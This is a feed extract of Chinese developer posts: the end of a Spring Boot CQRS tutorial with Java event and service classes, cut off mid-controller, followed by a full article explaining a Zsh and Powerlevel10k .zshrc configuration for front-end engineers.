<h4 data-id="heading-11">读操作服务（Query Service）</h4>
<h5 data-id="heading-12"><code>OrderQueryService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-keyword">public</span> List&lt;OrderView&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findAll();
    }

    <span class="hljs-keyword">public</span> Optional&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findById(id);
    }
}
</code></pre>
<h3 data-id="heading-13">6. 创建事件和事件处理器</h3>
<h4 data-id="heading-14"><code>OrderCreatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-15"><code>OrderUpdatedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderUpdatedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;
}
</code></pre>
<h4 data-id="heading-16"><code>OrderDeletedEvent.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDeletedEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> Long orderId;
}
</code></pre>
<h3 data-id="heading-17">7. 事件发布器和处理器</h3>
<h4 data-id="heading-18">事件发布器</h4>
<h5 data-id="heading-19"><code>EventPublisher.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.ApplicationEventPublisher;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventPublisher</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ApplicationEventPublisher applicationEventPublisher;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EventPublisher</span><span class="hljs-params">(ApplicationEventPublisher applicationEventPublisher)</span> {
        <span class="hljs-built_in">this</span>.applicationEventPublisher = applicationEventPublisher;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publish</span><span class="hljs-params">(Object event)</span> {
        applicationEventPublisher.publishEvent(event);
    }
}
</code></pre>
<h4 data-id="heading-20">事件处理器</h4>
<h5 data-id="heading-21"><code>OrderEventListener.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.event.EventListener;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreatedEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>();
        orderView.setId(event.getOrderId().toString());
        orderView.setProduct(event.getProduct());
        orderView.setQuantity(event.getQuantity());
        orderView.setPrice(event.getPrice());
        orderViewRepository.save(orderView);
    }

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderUpdatedEvent</span><span class="hljs-params">(OrderUpdatedEvent event)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> orderViewRepository.findById(event.getOrderId().toString()).orElse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>());
        orderView.setProduct(event.getProduct());
        orderView.setQuantity(event.getQuantity());
        orderView.setPrice(event.getPrice());
        orderViewRepository.save(orderView);
    }

    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderDeletedEvent</span><span class="hljs-params">(OrderDeletedEvent event)</span> {
        orderViewRepository.deleteById(event.getOrderId().toString());
    }
}
</code></pre>
<h3 data-id="heading-22">8. 修改服务层发布事件</h3>
<h4 data-id="heading-23">修改写操作服务（Command Service）</h4>
<h5 data-id="heading-24"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> EventPublisher eventPublisher;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>();
        event.setOrderId(savedOrder.getId());
        event.setProduct(savedOrder.getProduct());
        event.setQuantity(savedOrder.getQuantity());
        event.setPrice(savedOrder.getPrice());
        eventPublisher.publish(event);
        <span class="hljs-keyword">return</span> savedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        <span class="hljs-type">OrderUpdatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderUpdatedEvent</span>();
        event.setOrderId(updatedOrder.getId());
        event.setProduct(updatedOrder.getProduct());
        event.setQuantity(updatedOrder.getQuantity());
        event.setPrice(updatedOrder.getPrice());
        eventPublisher.publish(event);
        <span class="hljs-keyword">return</span> updatedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
        <span class="hljs-type">OrderDeletedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderDeletedEvent</span>();
        event.setOrderId(id);
        eventPublisher.publish(event);
    }
}
</code></pre>
<h3 data-id="heading-25">9. 创建控制器</h3>
<h4 data-id="heading-26">写操作控制器（Command Controller）</h4>
<h5 data-id="heading-27"><code>OrderCommandController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCommandService orderCommandService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderCommandService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> Order order)</span> {
        order.setId(id); <span class="hljs-comment">// Ensure the order ID is set correctly</span>
        
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《打造高效的前端工程师终端：一份可复制的 Zsh + Powerlevel10k 配置实践》]]></title>    <link>https://juejin.cn/post/7600990891206672411</link>    <guid>https://juejin.cn/post/7600990891206672411</guid>    <pubDate>2026-01-30T09:21:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891206672411" data-draft-id="7600967006892982281" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《打造高效的前端工程师终端：一份可复制的 Zsh + Powerlevel10k 配置实践》"/> <meta itemprop="keywords" content="前端工程化"/> <meta itemprop="datePublished" content="2026-01-30T09:21:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="WaitingChen"/> <meta itemprop="url" content="https://juejin.cn/user/1900414998429544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《打造高效的前端工程师终端：一份可复制的 Zsh + Powerlevel10k 配置实践》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1900414998429544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    WaitingChen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:21:40.000Z" title="Fri Jan 30 2026 09:21:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>目标很简单：<strong>快、稳、爽</strong>。</p>
<p>快：打开终端不拖泥带水；
稳：补全、历史、插件不互相打架；
爽：<code>git commit</code> 这种高频命令，肌肉记忆级体验。</p>
</blockquote>
<p>这篇文章基于一份<strong>可直接使用的 <code>.zshrc</code> 配置</strong>，完整讲清楚每一段配置解决了什么问题、为什么要这样放、以及它带来的实际体验提升。</p>
<h2 data-id="heading-0">一、为什么要“认真配置”终端？</h2>
<p>对于前端工程师来说，终端并不是偶尔用一下的工具，而是：</p>
<ul>
<li>高频 Git 操作（<code>git commit / rebase / checkout</code>）</li>
<li>包管理（<code>pnpm / npm / yarn</code>）</li>
<li>本地调试、构建、脚手架</li>
</ul>
<p>如果终端具备下面这些能力：</p>
<ul>
<li><strong>↑ / ↓ 只在“相关历史”里循环</strong></li>
<li><strong>自动联想但不抢键</strong></li>
<li><strong>补全稳定、无卡顿</strong></li>
</ul>
<p>每天节省的不是几秒，而是<strong>注意力和心智负担</strong>。</p>
<h2 data-id="heading-1">二、整体结构设计原则</h2>
<p>这份配置遵循几个明确的原则：</p>
<ol>
<li><strong>启动相关的配置尽量靠前</strong>（避免闪屏、卡顿）</li>
<li><strong>功能性模块分区清晰</strong>（补全、历史、联想、高亮各司其职）</li>
<li><strong>顺序严格</strong>（这是很多问题的根源）</li>
</ol>
<p>下面按模块逐一拆解。</p>
<h2 data-id="heading-2">三、Powerlevel10k Instant Prompt：启动速度的关键</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span> ]]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">source</span> <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>这是 Powerlevel10k 官方推荐的 <strong>Instant Prompt</strong> 写法，作用是：</p>
<ul>
<li>在 Zsh 完全初始化之前，<strong>先渲染 Prompt</strong></li>
<li>避免终端启动时的“白屏等待”</li>
</ul>
<h2 data-id="heading-3">四、NVM 与主题加载：稳定优先</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span> ] &amp;&amp; . <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span>

<span class="hljs-built_in">source</span> /opt/homebrew/share/powerlevel10k/powerlevel10k.zsh-theme
[[ -f ~/.p10k.zsh ]] &amp;&amp; <span class="hljs-built_in">source</span> ~/.p10k.zsh
</code></pre>
<p>这里选择的是<strong>最稳妥、最不容易出坑</strong>的方式：</p>
<ul>
<li>不做过度魔改</li>
<li>不提前优化启动时间</li>
</ul>
<p>如果后续需要追求极致启动速度，再对 NVM 做 lazy load 即可。</p>
<h2 data-id="heading-4">五、PATH 管理：去重是隐藏的工程师细节</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># 示例：将自定义工具加入 PATH（请按需修改或删除）</span>
<span class="hljs-comment"># export PATH="$HOME/.comate/bin:$PATH"</span>

<span class="hljs-built_in">typeset</span> -U PATH path
</code></pre>
<p><code>typeset -U PATH path</code> 的作用是：</p>
<ul>
<li>自动去重 PATH</li>
<li><strong>保留第一次出现的顺序</strong></li>
</ul>
<p>这能避免：</p>
<ul>
<li>PATH 无限增长</li>
<li>同一个二进制被多次扫描</li>
</ul>
<p>属于“看不见，但很专业”的配置。</p>
<h2 data-id="heading-5">六、补全系统：一切体验的地基</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">autoload</span> -Uz compinit
compinit -d ~/.zcompdump
</code></pre>
<p>补全系统是很多插件的基础（包括自动联想）。</p>
<p>显式指定 <code>.zcompdump</code> 文件可以：</p>
<ul>
<li>避免偶发的补全重建</li>
<li>提高稳定性</li>
</ul>
<p><strong>顺序要求</strong>：</p>
<blockquote>
<p><code>compinit</code> 必须在 autosuggestions 之前。</p>
</blockquote>
<h2 data-id="heading-6">七、历史行为优化：让“↑”变聪明</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">setopt</span> HIST_IGNORE_ALL_DUPS
<span class="hljs-built_in">setopt</span> HIST_REDUCE_BLANKS
<span class="hljs-built_in">setopt</span> INC_APPEND_HISTORY
<span class="hljs-built_in">setopt</span> SHARE_HISTORY
</code></pre>
<p>这些选项共同解决了几个痛点：</p>
<ul>
<li>同一条命令不会无限刷历史</li>
<li>多余空格不会影响匹配</li>
<li>多个终端窗口共享历史</li>
</ul>
<p>结果是：</p>
<blockquote>
<p>历史记录更干净，搜索更精准。</p>
</blockquote>
<h2 data-id="heading-7">八、↑ / ↓ 前缀历史搜索（核心体验）</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[A'</span> history-beginning-search-backward
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[B'</span> history-beginning-search-forward
</code></pre>
<p>这是整份配置的<strong>灵魂部分</strong>。</p>
<h3 data-id="heading-8">行为对比</h3>
<p>历史中有：</p>
<pre><code class="hljs language-sh" lang="sh">git commit -m <span class="hljs-string">"init"</span>
git commit --amend
git checkout main
pnpm install
</code></pre>
<p>当你输入：</p>
<pre><code class="hljs language-sh" lang="sh">git commit
</code></pre>
<p>按 ↑ / ↓：</p>
<ul>
<li>✅ 只会出现 <code>git commit ...</code></li>
<li>❌ 不会混入 <code>checkout / pnpm</code></li>
</ul>
<p>这是<strong>严格的前缀匹配</strong>，非常适合 Git 这类命令族。</p>
<h2 data-id="heading-9">九、自动联想：辅助而不是干扰</h2>
<pre><code class="hljs language-sh" lang="sh">ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="hljs-string">'fg=8'</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh
</code></pre>
<ul>
<li>灰色提示足够克制</li>
<li>只做“提示”，不抢控制权</li>
</ul>
<p>并且通过 <code>-M emacs</code> 的 bindkey 写法，确保它不会和 ↑ / ↓ 行为冲突。</p>
<h2 data-id="heading-10">十、语法高亮：为什么必须放最后？</h2>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
</code></pre>
<p>这是官方和社区反复强调的一点：</p>
<blockquote>
<p><code>zsh-syntax-highlighting</code> <strong>必须是最后加载的插件</strong>。</p>
</blockquote>
<p>否则会出现：</p>
<ul>
<li>高亮失效</li>
<li>与其他插件冲突</li>
</ul>
<h2 data-id="heading-11">十一、最终配置（可直接使用）</h2>
<p>下面是一份<strong>完整、可直接复制使用的 <code>.zshrc</code> 最终配置</strong>。</p>
<blockquote>
<p>说明：</p>
<ul>
<li>已包含 Powerlevel10k Instant Prompt</li>
<li>支持 <code>git commit</code> 等命令的 <strong>↑ / ↓ 严格前缀历史搜索</strong></li>
<li>自动联想、高亮、补全顺序全部正确</li>
<li>适合长期作为主力终端配置使用</li>
</ul>
</blockquote>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">########################################</span>
<span class="hljs-comment"># Powerlevel10k instant prompt（必须靠前）</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span> ]]; <span class="hljs-keyword">then</span>
  <span class="hljs-built_in">source</span> <span class="hljs-string">"<span class="hljs-variable">${XDG_CACHE_HOME:-<span class="hljs-variable">$HOME</span>/.cache}</span>/p10k-instant-prompt-<span class="hljs-variable">${(%):-%n}</span>.zsh"</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># 基础环境</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm"</span>
[ -s <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span> ] &amp;&amp; . <span class="hljs-string">"/opt/homebrew/opt/nvm/nvm.sh"</span>

<span class="hljs-comment"># Powerlevel10k 主题</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/powerlevel10k/powerlevel10k.zsh-theme
[[ -f ~/.p10k.zsh ]] &amp;&amp; <span class="hljs-built_in">source</span> ~/.p10k.zsh

<span class="hljs-comment"># PATH 去重</span>
<span class="hljs-built_in">typeset</span> -U PATH path

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># Zsh 补全系统</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">autoload</span> -Uz compinit
compinit -d ~/.zcompdump

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># 历史行为优化</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">setopt</span> HIST_IGNORE_ALL_DUPS
<span class="hljs-built_in">setopt</span> HIST_REDUCE_BLANKS
<span class="hljs-built_in">setopt</span> INC_APPEND_HISTORY
<span class="hljs-built_in">setopt</span> SHARE_HISTORY

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># 自动联想（灰色提示）</span>
<span class="hljs-comment">########################################</span>
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=<span class="hljs-string">'fg=8'</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-autosuggestions/zsh-autosuggestions.zsh

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># ↑ / ↓ 前缀历史搜索（git commit 友好）</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[A'</span> history-beginning-search-backward
<span class="hljs-built_in">bindkey</span> -M emacs <span class="hljs-string">'^[[B'</span> history-beginning-search-forward

<span class="hljs-comment">########################################</span>
<span class="hljs-comment"># 语法高亮（必须放最后）</span>
<span class="hljs-comment">########################################</span>
<span class="hljs-built_in">source</span> /opt/homebrew/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
</code></pre>
<h2 data-id="heading-12">十二、最终效果总结</h2>
<p>使用这份配置，你会得到：</p>
<ul>
<li><strong>启动快、不闪屏</strong>（Powerlevel10k Instant Prompt）</li>
<li><strong>补全稳定</strong>（compinit 顺序正确）</li>
<li><strong>历史搜索精准</strong>（前缀匹配）</li>
<li><strong>自动联想不干扰操作</strong></li>
</ul>
<p>这不是“炫技型配置”，而是：</p>
<blockquote>
<p><strong>适合长期使用的工程师终端基建。</strong></p>
</blockquote>
<h2 data-id="heading-13">结语</h2>
<p>终端配置的价值，不在于你用了多少插件，而在于：</p>
<ul>
<li>是否减少了无意义的操作</li>
<li>是否让高频行为变成肌肉记忆</li>
</ul>
<p>如果你每天要敲几十次 <code>git commit</code>，
那么让 ↑ 键“只做正确的事”，本身就已经非常值得了。</p>
<blockquote>
<p>后续可以继续进阶的方向：</p>
<ul>
<li>NVM lazy load（秒开终端）</li>
<li>Git / pnpm 专用快捷键</li>
<li>ZLE Widget 深度定制</li>
</ul>
</blockquote>
